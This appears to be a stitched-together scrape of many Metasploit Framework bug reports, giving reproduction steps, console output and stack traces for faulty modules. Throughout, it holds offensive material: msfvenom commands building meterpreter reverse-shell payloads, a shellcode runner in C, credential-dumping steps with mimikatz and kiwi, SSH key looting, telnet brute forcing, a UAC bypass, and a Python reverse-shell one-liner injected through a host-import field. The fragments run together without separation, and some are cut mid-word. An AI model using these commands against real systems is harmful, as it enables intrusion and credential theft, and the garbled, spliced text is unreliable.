`msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp lhost=192.168.0.1 exitfunc=seh -e x86/unicode_upper -f raw` that also happens with **x86/unicode_mixed** and/or with different payloads
use auxiliary/scanner/postgres/postgres_login
set rhost <target>
select a module that performs command execution, like the one in
select target 1 (windows command) or 3 (linux command)
set cmd "calc.exe"
open up msfconsole
type in "search author:istv " (sans the quotes)
get the following stack trace: ```
[-] error while running command search: incompatible encoding regexp match (ascii-8bit regexp with utf-8 string) call stack:
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:53:in `=~'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:53:in `block (4 levels) in is_match'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:53:in `any?'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:53:in `block (3 levels) in is_match'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:42:in `each'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:42:in `block (2 levels) in is_match'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:39:in `each'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:39:in `block in is_match'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:37:in `each'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:37:in `is_match'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:20:in `block in find'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:19:in `each'
/home/tekwizz123/git/metasploit-framework/lib/msf/core/modules/metadata/search.rb:19:in `find'
/home/tekwizz123/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/modules.rb:420:in `cmd_search'
/home/tekwizz123/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/home/tekwizz123/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/home/tekwizz123/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/home/tekwizz123/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/home/tekwizz123/git/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'
/home/tekwizz123/git/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/home/tekwizz123/git/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
./msfconsole:17:in `<main>'
`use linux/redis/redis_unauth_exec` against a debian 10 server with redis installed
(tested with redis server v=5.0.3 sha=00000000:0 malloc=jemalloc-5.1.0 bits=64 build=afa0decbb6de285f)
set `rhost`, `lhost`, `srvhost`
install ruby - windows
install metasploit framework - windows build (referenced from rsions.
use auxiliary/scanner/dcerpc/windows_deployment_services
use use auxiliary/scanner/smb/smb_uninit_cred
use auxiliary/scanner/smb/pipe_dcerpc_auditor
msf5 > hosts -c address,tags
use linux/redis/redis_unauth_exec
set srvhost x.x.x.x
set rhosts x.x.x.x
``` which outputs: ```
msf5 exploit(linux/redis/redis_unauth_exec) > check
[*] 0.0.0.0:6379 - this module does not support check.
``` but if you open up `irb`, there is a check method available: ```
msf5 exploit(linux/redis/redis_unauth_exec) > irb
[*] starting irb shell...
[*] you are in exploit/linux/redis/redis_unauth_exec >> check [-] 10.10.10.160:6379 - cannot retrieve redis version, please check it manually
=> #<struct msf::exploit::checkcode code="unknown", message="cannot reliably check exploitability.", reason=nil>
``` location: ```
>> method(:check).source_location
=> ["/users/user/documents/code/metasploit-framework/modules/exploits/linux/redis/redis_unauth_exec.rb", 73]
``` also within the source code: #l70-l97
check that page:
there check links for "certutil" (-> "debug_write" (-> etc
created a meterpreter session and tried to get into a shell
error shows: [ -] error running command shell: argumenterror wrong number of arguments (given 4, expected 5)
![image]( tried this on htb nibbles as you can see
in my case, i've used two different payloads to test and i get the same results
windows/x64/meterpreter/reverse_tcp and php/meterpreter/reverse_tcp
in both cases i\'ve got the error "argumenterror wrong number of arguments (given 4, expected 5)"
generate an executable using the payloads explained above.
start my handler in msfconsole.
get the meterpreter session.
crash when i run the command "shell": argumenterror wrong number of arguments (given 4, expected 5).
the target machine is windows 10
windows defender and firewall disabled
it also happens with some post-exploitaition modules: post(windows/manage/enable_rdp) > exploit [*] enabling remote desktop
[*] rdp is disabled; enabling it ...
[*] setting terminal services service startup mode
[*] the terminal services service is not set to auto, changing it to auto ...
[*] opening port in local firewall if necessary
[*] the following error was encountered: argumenterror wrong number of arguments (given 4, expected 5)
[*] for cleanup execute meterpreter resource file: /home/user/.msf4/loot/20200311225614_default_192.168.1.101_host.windows.cle_656289.txt
[*] post module execution completed
load the plugin:
msf5 > load libnotify [*] successfully loaded plugin: libnotify
now if we import the hosts' info from another tool (as faraday, openvas or nessus) and we don't have limitations in the hostname field, the importer plugin will run our field without sanitizing the plugin will run something similar to: ```
[*] starting irb shell...
[*] you are in the "framework" object >> db.find_or_create_host(:workspace => \'pepe\', :host => \'192.168.6.16\', :state => msf::hoststate::alive, :os_name => \'begin\\\'; python -c \\\'import socket
,subprocess,os;s=socket.socket(socket.af_inet,socket.sock_stream);s.connect(("127.0.0.1",3333));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.f
ileno(),2);p=subprocess.call(["/bin/sh","-i"])\')
in this case, i made a little poc running a reverse shell in another port the impact is really low because tools as nmap filter the hostname based on the fingerprint of the os so is not easy to trigger the bug in a scan for example, but in a plugin importer could be fit
`$ docker pull metasploitframework/metasploit-framework`
`$ docker run -it metasploitframework/metasploit-framework`
`msf5 > load wmap` result
[-] error while running command load: wrong number of arguments (given 4, expected 1..3) call stack:
/usr/src/metasploit-framework/lib/rex/logging/log_dispatcher.rb:137:in `elog'
/usr/src/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:757:in `rescue in load_plugin'
/usr/src/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:752:in `load_plugin'
/usr/src/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:775:in `cmd_load'
/usr/src/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command'
/usr/src/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single'
/usr/src/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each'
/usr/src/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single'
/usr/src/metasploit-framework/lib/rex/ui/text/shell.rb:158:in `run'
/usr/src/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start'
/usr/src/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start'
./msfconsole:49:in `<main>'
run 'use auxiliary/scanner/postgres/postgres_<any>' or 'exploit/linux/postgres/postgres_payload' 1
use 'use auxiliary/scanner/postgres/postgres_<any>'
run the victime is running centos7 with postgres-11.
create this module `modules/exploits/windows/import_target_defaults_test.rb`
# this module requires metasploit:
# current source:
## class metasploitmodule < msf::exploit::remote rank = normalranking include exploit::remote::tcp def initialize(info = {}) super( update_info( info, 'name' => 'sample exploit', 'description' => %q( foo ), 'license' => msf_license, 'author' => ['skape'], 'targets' => [ # target 0: windows all [ 'windows xp/vista/7/8', { 'platform' => 'win', 'ret' => , 'defaultoptions' => { 'disablepayloadhandler' => true, 'wfsdelay' => 0 } } ], [ 'windows 10', { 'platform' => 'win', 'ret' => , 'defaultoptions' => { 'disablepayloadhandler' => false, 'wfsdelay' => 90 } } ] ], 'defaulttarget' => 0 ) ) #import_target_defaults end def exploit return end
`./msfconsole`
`msf5 > use exploits/windows/import_target_defaults_test`
target 0 is the default target:
msf5 exploit(windows/import_target_defaults_test) > show options module options (exploit/windows/import_target_defaults_test): name current setting required description ---- --------------- -------- ----------- rhosts yes the target host(s), range cidr identifier, or hosts file with syntax 'file:<path>' rport yes the target port (tcp) exploit target: id name -- ---- 0 windows xp/vista/7/8
the advanced options `disablepayloadhandler` and `wfsdelay` are not set as expected
msf5 exploit(windows/import_target_defaults_test) > show advanced module advanced options (exploit/windows/import_target_defaults_test): name current setting required description ---- --------------- -------- ----------- chost no the local client address cport no the local client port connecttimeout 10 yes maximum number of seconds to establish a tcp connection contextinformationfile no the information file that contains context information disablepayloadhandler false no disable the handler code for the selected payload enablecontextencoding false no use transient context when encoding payloads proxies no a proxy chain of format type:host:port[,type:host:port][...] ssl false no negotiate ssl/tls for outgoing connections sslcipher no string for ssl cipher - "dhe-rsa-aes256-sha" or "adh" sslverifymode peer no ssl verification method (accepted: client_once, fail_if_no_peer_cert, none, peer) sslversion auto yes specify the version of ssl/tls to be used (auto, tls and ssl23 are auto-negotiate) (accepted: auto, tls, ssl23, ssl3, tls1, tls1.1, tls1.2) verbose false no enable detailed status messages workspace no specify the workspace for this module wfsdelay 0 no additional delay when waiting for a session
even after executing the exploit, these options are still not set correctly:
msf5 exploit(windows/import_target_defaults_test) > set rhosts 172.16.60.173
rhosts => 172.16.60.173
msf5 exploit(windows/import_target_defaults_test) > set rport 25
rport => 25
msf5 exploit(windows/import_target_defaults_test) > run [*] started reverse tcp handler on 172.16.60.1:4444
[*] exploit completed, but no session was created.
msf5 exploit(windows/import_target_defaults_test) > show advanced module advanced options (exploit/windows/import_target_defaults_test): name current setting required description ---- --------------- -------- ----------- chost no the local client address cport no the local client port connecttimeout 10 yes maximum number of seconds to establish a tcp connection contextinformationfile no the information file that contains context information disablepayloadhandler false no disable the handler code for the selected payload enablecontextencoding false no use transient context when encoding payloads proxies no a proxy chain of format type:host:port[,type:host:port][...] ssl false no negotiate ssl/tls for outgoing connections sslcipher no string for ssl cipher - "dhe-rsa-aes256-sha" or "adh" sslverifymode peer no ssl verification method (accepted: client_once, fail_if_no_peer_cert, none, peer) sslversion auto yes specify the version of ssl/tls to be used (auto, tls and ssl23 are auto-negotiate) (accepted: auto, tls, ssl23, ssl3, tls1, tls1.1, tls1.2) verbose false no enable detailed status messages workspace no specify the workspace for this module wfsdelay 0 no additional delay when waiting for a session
the `defaultoptions` are correctly imported if you explicitly set the target:
msf5 exploit(windows/import_target_defaults_test) > set target 1
target => 1
msf5 exploit(windows/import_target_defaults_test) > show advanced module advanced options (exploit/windows/import_target_defaults_test): name current setting required description ---- --------------- -------- ----------- chost no the local client address cport no the local client port connecttimeout 10 yes maximum number of seconds to establish a tcp connection contextinformationfile no the information file that contains context information disablepayloadhandler false no disable the handler code for the selected payload enablecontextencoding false no use transient context when encoding payloads proxies no a proxy chain of format type:host:port[,type:host:port][...] ssl false no negotiate ssl/tls for outgoing connections sslcipher no string for ssl cipher - "dhe-rsa-aes256-sha" or "adh" sslverifymode peer no ssl verification method (accepted: client_once, fail_if_no_peer_cert, none, peer) sslversion auto yes specify the version of ssl/tls to be used (auto, tls and ssl23 are auto-negotiate) (accepted: auto, tls, ssl23, ssl3, tls1, tls1.1, tls1.2) verbose false no enable detailed status messages workspace no specify the workspace for this module wfsdelay 90 no additional delay when waiting for a session
#### step 1: select a python module start a msfconsole and select **any** python module
in this issue, module `exploit/windows/smb/ms17_010_eternalblue_win8` is used
the module file itself on disk is `/usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.py`
after this step, the console window will have the following output.
mantlebao@mantlekali:~$ msfconsole
[ banner omitted ]
msf5 exploit(linux/redis/redis_unauth_exec) > use exploit/windows/smb/ms17_010_
use exploit/windows/smb/ms17_010_eternalblue
use exploit/windows/smb/ms17_010_eternalblue_win8
use exploit/windows/smb/ms17_010_psexec
msf5 exploit(linux/redis/redis_unauth_exec) > use exploit/windows/smb/ms17_010_eternalblue_win8 msf5 exploit(windows/smb/ms17_010_eternalblue_win8) >
#### step 2: run `save` command run `save` command, and then exit.
console output:
msf5 exploit(windows/smb/ms17_010_eternalblue_win8) > save
saved configuration to: /home/mantlebao/.msf4/config
msf5 exploit(windows/smb/ms17_010_eternalblue_win8) > exit
mantlebao@mantlekali:~$
``` #### step 3: re-enter the console
type `msfconsole` to start a new console
notice the false warning given and the module which is actually loaded successfully.
mantlebao@mantlekali:~$ msfconsole
[-] warning! the following modules could not be loaded!
[-] /usr/share/metasploit-framework/modules/exploits/windows/smb/ms17_010_eternalblue_win8.rb
[-] please see /home/mantlebao/.msf4/logs/framework.log for details
[ banner omitted ] msf5 exploit(windows/smb/ms17_010_eternalblue_win8) >
set auth_time to "false"
run leads to the following error
_[-] auxiliary failed: nomethoderror undefined method `<=' for nil:nilclass
[-] call stack:
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/http/owa_login.rb:256:in `try_user_pass'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/http/owa_login.rb:139:in `block in run'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/auth_brute.rb:211:in `block in each_user_pass'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/auth_brute.rb:179:in `each'
[-] /usr/share/metasploit-framework/lib/msf/core/auxiliary/auth_brute.rb:179:in `each_user_pass'
[-] /usr/share/metasploit-framework/modules/auxiliary/scanner/http/owa_login.rb:136:in `run\'_ problem is that variable "elapsed_time" is used in all print messages (successful login, failed login, etc.) but only defined if auth_time is set to "true"
potential fix:
always define "elapsed_time", e.g
set it to zero.
this requires extending "if" checks ("elapsed_time <= 1") with e.g
"(elapsed_time > 0) && (elapsed_time <= 1)"
attached diff with potential fix:
[owa_login.diff.txt](
when calling `console.read` with any bash command such as `cat filename.txt` it does not returns the output of that command.
### payloads i've tried
i've generated the following
all give the same output: segfault.
# elf's, normal; reverse http and tcp
$ msfvenom -a x64 --platform linux -p linux/x64/meterpreter_reverse_http lhost=10.x.x.x lport=443 -b "\\x00" -i 3 -f elf -o ubuntu_priv443_3 $ msfvenom -a x86 --platform linux -p linux/x86/meterpreter_reverse_http lhost=10.x.x.x lport=443 -b "\\x00" -i 3 -f elf -o ubuntu_priv443_3
$ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_tcp lhost=10.x.x.x lport=443 -b "\\x00" -e x86/xor_dynamic -i 3 -f elf -o ubuntu_priv443_3 # elf, nonx (public and private ip of handler)
$ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_nonx_tcp lhost=10.x.x.x lport=443 -b "\\x00" -e x86/xor_dynamic -i 3 -f elf -o ubuntu_priv443_nonx_3
$ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_nonx_tcp lhost=<pub-ip> lport=443 -b "\\x00" -e x86/xor_dynamic -i 3 -f elf -o ubuntu_priv443_nonx_3 # c, nonx (public and private ip of handler)
$ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_nonx_tcp lhost=10.x.x.x lport=443 -b "\\x00" -e x86/xor_dynamic -i 3 -f c -o ubuntu_priv443_3
$ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_nonx_tcp lhost=<pub-ip>
lport=443 -b "\\x00" -e x86/xor_dynamic -i 3 -f c -o ubuntu_pub443_3 # same, less encoding
$ msfvenom -a x86 --platform linux -p linux/x86/meterpreter/reverse_nonx_tcp lhost=<pub-ip>
lport=443 -b "\\x00" -e x86/xor_dynamic -i 1 -f c -o ubuntu_pub443_3
``` c function: ```
main() { printf("shellcode length: %d\ ", strlen(buf)); int (*ret)() = (int(*)())buf; ret(); }
``` c compilation flags:
`gcc -z execstack -fno-stack-protector -o <filename> <filename>.c`
using the `auxiliary/scanner/mysql/mysql_login` module, the description says: > this module simply queries the mssql instance for a specific user/pass (default is sa with blank)
but the default settings don't have the username set to sa so running the module fails.
spawn osx meterpreter session
run `exploit/local/osx/persistence`
`use payload/osx/x64/meterpreter_reverse_https`
`set lhost eth0`
`set lport 443`
`set payloaduuidname test`
`set payloaduuidtracking true`
`generate -f macho -o rev-https-test.macho`
[x] `msfconsole -r mac.rc`
[x] spawn a native max os x reverse_tcp staged payload
[x] `exit -y # exit without killing the agent`
[x] `msfconsole -r mac.rc` spawn a native mac os x staged reverse_tcp, exit the handler and restart it.
after the agent reconnects, the handler tries to stage again the payload instead of recognizing the fully loaded meterpreter
trying to use the route add/delete or the autoroute post module leads to an error
as a result, new routes can't be added on the console for pivoting purposes due to a potential rename of a function call.
this was replicated with both windows meterprete x86 and x64 reverse_tcp payloads
potentially associated with issue: #11491
use exploit/windows/http/efs_fmsw_userid_bof
set rhosts <ip>
set rport <port>
run rsions.
hi, i tried to use telnet_login with the username: root and blank passwords are allowed
i did this:
msf5 auxiliary(scanner/telnet/telnet_login) > set rhosts 192.168.188.26
rhosts => 192.168.188.26
msf5 auxiliary(scanner/telnet/telnet_login) > set stop_on_success true
stop_on_success => true
msf5 auxiliary(scanner/telnet/telnet_login) > set blank_passwords true
blank_passwords => true
msf5 auxiliary(scanner/telnet/telnet_login) > set user_file /root/desktop/adminname.txt
user_file => /root/desktop/adminname.txt
msf5 auxiliary(scanner/telnet/telnet_login) > set pass_file /root/desktop/adminpas.txt
pass_file => /root/desktop/adminpas.txt
msf5 auxiliary(scanner/telnet/telnet_login) > run
## output is this:
[-] 192.168.188.26:23 - 192.168.188.26:23 - login failed: admin: (incorrect: )
[-] 192.168.188.26:23 - 192.168.188.26:23 - login failed: admin:root (incorrect: )
[-] 192.168.188.26:23 - 192.168.188.26:23 - login failed: admin:admin (incorrect: )
[-] 192.168.188.26:23 - 192.168.188.26:23 - login failed: admin:1234 (incorrect: )
[-] 192.168.188.26:23 - 192.168.188.26:23 - login failed: admin:4567 (incorrect: )
[-] 192.168.188.26:23 - 192.168.188.26:23 - login failed: admin: (incorrect: )
[-] 192.168.188.26:23 - 192.168.188.26:23 - login failed: admin:admin1234 (incorrect: )
*] 192.168.188.26:23 - error: 192.168.188.26: regexperror unmatched close parenthesis: /root _ _ _ | | | | | | | | ___ | |__ ___| |_ ___ _ __ | | \\/ _ \\| '_ \\/ __| __\\/ _ \\ '__|
| |___| (_) | |_) \\__ \\ || __\\/ | |______\\___\\/|_.__\\/|___\\/\\__\\___|_| 's/
[*] 192.168.188.26:23 - scanned 1 of 1 hosts (100% complete)
[*] auxiliary module execution completed
open a meterpreter session with windows and create route for it's network
start eternalblue for host of this network.
msf latest, meterpreter runs as system.
also crashes in some minuts if used for port scanning or something like that.
starting metasploit v5.0.63-dev
use exploit/multi/script/web_delivery
exploit target is 0-python by default
set ssl true
set lhost 127.0.0.1
observe the generated command to run:
`python -c "import sys;u=__import__(\'urllib\'+{2:\'\',3:\'.request\'}[sys.version_info[0]],fromlist=(\'urlopen\',));r=u.urlopen(\' "`
run command on target system (localhost here)
_regression of #10551_ 1
`msfvenom -p windows/meterpreter/reverse_https lhost=127.0.0.1 lport=443 -b '\\x00\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x0a\\x0d\\x20\\x40\\x50\\x60' --smallest -f python`
obtain a x64 meterpreter session on a x64 windows 10 host under an admin user but in a non-elevated context (because we want to bypass uac)
use bypassuac_silentcleanup module with commands:
use exploits/windows/local/bypassuac_silentcleanup
set session 1
as we didn't select a payload, windows/meterpreter/reverse_tcp (-> x86) will be selected by default
`search type:auxiliary`
`use 1083` (this uses the sip invite spoof module, which is displayed as supporting check by search)
you should get a message saying that "this module does not support check."
- if you run module post/multi/gather/ssh_creds as unprivileged user, you might encounter following exception(s) during looting [*] looting 3 directories
[+] downloaded /home/fox/.ssh/authorized_keys -> /root/.msf4/loot/20191119063443_default_10.28.175.104_ssh.authorized_k_668127.txt
[-] could not load ssh key: neither pub key nor priv key
[-] post failed: rex::post::meterpreter::requesterror stdapi_fs_ls: operation failed: 1
[-] call stack:
[-] /usr/share/metasploit-framework/lib/rex/post/meterpreter/extensions/stdapi/fs/dir.rb:62:in `entries'
[-] /usr/share/metasploit-framework/modules/post/multi/gather/ssh_creds.rb:47:in `block in download_loot'
[-] /usr/share/metasploit-framework/modules/post/multi/gather/ssh_creds.rb:43:in `each'
[-] /usr/share/metasploit-framework/modules/post/multi/gather/ssh_creds.rb:43:in `download_loot'
[-] /usr/share/metasploit-framework/modules/post/multi/gather/ssh_creds.rb:38:in `run'
use exploit/multi/script/web_delivery
set target 2
set ssl true
set payload windows/x64/meterpreter/reverse_https
set srvport 80
set lhost eth1
set lport 443
set autounhookprocess true
as an example, i will use #12486 pr (scanner/http/host_header_injection aux module), which makes use of `#report_web_vuln`:
msf5 auxiliary(scanner/http/host_header_injection) > db_status
[*] connected to remote_data_service: (
connection type: http
connection name: local-https-data-service.
msf5 auxiliary(scanner/http/host_header_injection) > run [+] 1.2.3.4:80/drupal/ (1.2.3.4)(200)(get)(evidence into body) is vulnerable to http host header injection
[-] auxiliary failed: nomethoderror undefined method `report_web_vuln' for #<metasploit::framework::dataservice::remotehttpdataservice: >
did you mean? report_vuln report_web_site
[-] call stack:
[-] /r7/src/metasploit-framework/lib/metasploit/framework/data_service/proxy/core.rb:136:in `method_missing'
[-] /r7/src/metasploit-framework/lib/msf/core/auxiliary/report.rb:363:in `report_web_vuln'
[-] /r7/src/metasploit-framework/modules/auxiliary/scanner/http/host_header_injection.rb:99:in `run_host'
[-] /r7/src/metasploit-framework/lib/msf/core/auxiliary/scanner.rb:111:in `block (2 levels) in run'
[-] /r7/src/metasploit-framework/lib/msf/core/thread_manager.rb:106:in `block in spawn'
[*] auxiliary module execution completed
use exploit/multi/http/atutor_sqli
set targeturi /atutor/
set rhost insert_remote_ip_address_here
set rport 80
exploit tested against a remote ubuntu machine.
verbose option was on.
1.msf5 exploit(linux/ssh/exagrid_known_privkey) > show options module options (exploit/linux/ssh/exagrid_known_privkey): name current setting required description ---- --------------- -------- ----------- rhosts x.x.x.x yes the target address range or cidr identifier rport 22 yes the target port payload options (cmd/unix/interact): name current setting required description ---- --------------- -------- ----------- exploit target: id name -- ---- 0 universal msf5 exploit(linux/ssh/exagrid_known_privkey) > run [-] 180.250.166.130:22 ssh - failed authentication
[+] successful login
[*] command shell session 7 opened (x.x.x.x:39715 -> x.x.x.x:22) at 2019-09-20 10:46:18 +0000 shell
[*] trying to find binary(python) on target machine
[-] session manipulation failed: undefined method `strip\' for nil:nilclass ["/rahasia/git/metasploit-framework/lib/msf/base/sessions/command_shell.rb:326:in `binary_exists\'", "/rahasia/git/metasploit-framework/lib/msf/base/sessions/command_shell.rb:282:in `cmd_shell\'", "/rahasia/git/metasploit-framework/lib/msf/base/sessions/command_shell.rb:604:in `run_builtin_cmd\'", "/rahasia/git/metasploit-framework/lib/msf/base/sessions/command_shell.rb:592:in `run_single\'", "/rahasia/git/metasploit-framework/lib/msf/base/sessions/command_shell.rb:761:in `_interact_stream\'", "/rahasia/git/metasploit-framework/lib/msf/base/sessions/command_shell.rb:745:in `_interact\'", "/rahasia/git/metasploit-framework/lib/rex/ui/interactive.rb:51:in `interact\'", "/rahasia/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/core.rb:1364:in `cmd_sessions\'", "/rahasia/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command\'", "/rahasia/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single\'", "/rahasia/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each\'", "/rahasia/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single\'", "/rahasia/git/metasploit-framework/lib/msf/ui/console/command_dispatcher/exploit.rb:215:in `cmd_exploit\'", "/rahasia/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:523:in `run_command\'", "/rahasia/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:474:in `block in run_single\'", "/rahasia/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `each\'", "/rahasia/git/metasploit-framework/lib/rex/ui/text/dispatcher_shell.rb:468:in `run_single\'", "/rahasia/git/metasploit-framework/lib/rex/ui/text/shell.rb:151:in `run\'", "/rahasia/git/metasploit-framework/lib/metasploit/framework/command/console.rb:48:in `start\'", "/rahasia/git/metasploit-framework/lib/metasploit/framework/command/base.rb:82:in `start\'", "./msfconsole:49:in `<main>\'"]
msf5 exploit(linux/ssh/exagrid_known_privkey) > 2
msf5 exploit(linux/ssh/exagrid_known_privkey) > version
framework: 5.0.47-dev-acb351ac44
console : 5.0.47-dev-acb351ac44
msf5 exploit(linux/ssh/exagrid_known_privkey) > uname -a
[*] exec: uname -a linux ubuntu-s-4vcpu-8gb-fra1-01 4.15.0-52-generic #56-ubuntu smp tue jun 4 22:49:08 utc 2019 x86_64 x86_64 x86_64 gnu/linux
run `msfconsole`
`load wmap`
ensure you have a valid target
ensure that your target has vulnerabilities that wmap can discover
docker pull metasploitframework/metasploit-framework:latest
docker run metasploitframework/metasploit-framework:latest rsions.
root@kali:~# msfconsole
obtain meterpreter on a linux host ("meterpreter java/linux" in my case)
search files, e.g
> search -f *.xml
from a meterpreter session launched via psexec on windows xp, type `load mimikatz` and then `wdigest`
it crashes every time the meterpreter session
msf5 exploit(windows/smb/psexec) > run > [\\*] started reverse tcp handler on 192.168.56.102:4444 > [\\*] 192.168.56.119:445 - connecting to the server...
> [\\*] 192.168.56.119:445 - authenticating to 192.168.56.119:445|hackme2 as user 'harold'...
> [\\*] 192.168.56.119:445 - selecting native target
> [\\*] 192.168.56.119:445 - uploading payload..
xpnkxoum.exe
> [\\*] 192.168.56.119:445 - created \\xpnkxoum.exe...
> [\\+] 192.168.56.119:445 - service started successfully...
> [\\*] sending stage (179779 bytes) to 192.168.56.119
> [\\*] 192.168.56.119:445 - deleting \\xpnkxoum.exe...
> [\\*] meterpreter session 15 opened (192.168.56.102:4444 -> 192.168.56.119:1097) at 2019-08-24 14:58:55 -0400
> > meterpreter > load mimikatz > loading extension mimikatz...success.
> meterpreter > wdigest > [+] running as system
> [*] retrieving wdigest credentials
> > [*] 192.168.56.119 - meterpreter session 15 closed
reason: died this is on an english windows xp sp3 vm joined to a test domain
it always happened to me while doing pentests on real windows xp as well.
from a meterpreter session launched via psexec on windows, type `load kiwi`
first time, type `kiwi_cmd "sekurlsa::logonpasswords"` and it works fine
second time, run the same command again and the meterpreter session is "dying" every time
i have tried this on a 32 bits meterpreter session against windows 7, and on a 64 bits meterpreter session against windows 10 in a virtualbox environnement, both from a kali linux virtualbox vm, with metasploit 5.0.41-dev
this is a question about where the set command (-s) is that was found in msf4 as per the offensive security guide
it allows one to set a custom value for the payload options
example command follows
currently, there's no way to set a custom value for a payload options
we use the following option as an example
msf > use payload/windows/shell_bind_tcp
msf5 payload(windows/shell_bind_tcp) > show options module options (payload/windows/shell_bind_tcp): name current setting required description ---- --------------- -------- ----------- exitfunc seh yes exit technique (accepted: '', seh, thread, process, none) lport 1234 yes the listen port rhost no the target address
as you can see, there's no existing command `-o` for `generate` setting the options as found in the offensive security guide
the current `-o` in msf5 specifies a file output path you want to save your payload to.
usage: generate [options] generates a payload
options: -e force encoding -o <opt> deprecated: alias for the '-o' option -p <opt> total desired payload size, auto-produce approproate nopsled length -s <opt> the new section name to use when generating (large) windows binaries -b <opt> the list of characters to avoid example: '\\x00\\xff' -e <opt> the encoder to use -f <opt> output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war -h show this message -i <opt> the number of times to encode the payload -k preserve the template behavior and inject the payload as a new thread -n <opt> prepend a nopsled of [length] size on to the payload -o <opt> the output file name (otherwise stdout) -p <opt> the platform of the payload -s <opt> nop sled length
-x <opt> specify a custom executable file to use as a template
i can manually set the options for generate one by one as follows:
msf5 payload(windows/shell_bind_tcp) > set exitfunc seh
exitfunc => seh
what i want to do instead is do something like set the key value whenever i generate:
msf5 payload(windows/shell_bind_tcp) > generate -o lport=1234,exitfunc=seh
currently, -o seems to map to file output, so not sure what's the current command for setting the options for each payload
connect to msfconsole ```sh
./msfconsole
use a random payload
here, i'm following the instructions from offensive security, but it seems some of the commands don't work on msf5
as you can see, it doesn't do anythoing on the nop sled length `-s` command, even though it's documented.
msf > use payload/windows/shell_bind_tcp
msf5 payload(windows/shell_bind_tcp) > generate -s 14
usage: generate [options] generates a payload
options: -e force encoding -o <opt> deprecated: alias for the '-o' option -p <opt> total desired payload size, auto-produce approproate nopsled length -s <opt> the new section name to use when generating (large) windows binaries -b <opt> the list of characters to avoid example: '\\x00\\xff' -e <opt> the encoder to use -f <opt> output format: bash,c,csharp,dw,dword,hex,java,js_be,js_le,num,perl,pl,powershell,ps1,py,python,raw,rb,ruby,sh,vbapplication,vbscript,asp,aspx,aspx-exe,axis2,dll,elf,elf-so,exe,exe-only,exe-service,exe-small,hta-psh,jar,jsp,loop-vbs,macho,msi,msi-nouac,osx-app,psh,psh-cmd,psh-net,psh-reflection,vba,vba-exe,vba-psh,vbs,war -h show this message -i <opt> the number of times to encode the payload -k preserve the template behavior and inject the payload as a new thread -n <opt> prepend a nopsled of [length] size on to the payload -o <opt> the output file name (otherwise stdout) -p <opt> the platform of the payload -s <opt> nop sled length
-x <opt> specify a custom executable file to use as a template
``` rsions.
search something in msfconsole, name column is empty screenshot:
![msfsearch](
run the scanner/rdp/cve_2019_0708_bluekeep scanner module against an rdp server which returns a license error.
here are similar issues and ways of discovering such servers:
